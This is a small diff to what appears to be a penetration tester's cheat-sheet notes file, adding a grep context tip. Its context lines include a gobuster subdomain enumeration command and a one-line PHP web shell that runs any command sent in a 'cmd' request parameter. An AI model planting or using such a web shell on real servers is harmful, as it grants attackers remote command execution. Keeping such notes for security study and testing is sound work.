@@ -11,6 +11,8 @@ gobuster dns -w /opt/useful/SecLists/Discovery/DNS/subdomains-top1million-110000
 <?php if(isset($_REQUEST['cmd'])){ echo "<pre>"; $cmd = ($_REQUEST['cmd']); system($cmd); echo "</pre>"; die; }?>
 OR in grep: grep 'false\|nologin'
 to count lines: wc -l <filename>
+GREP 4 lines around match:
+grep -B 4 'blabla'
 
 Workspace alttab = CTRL+ALT+arrow // move window to a workspace: CTRL+ALT+SHIFT+arrow
 
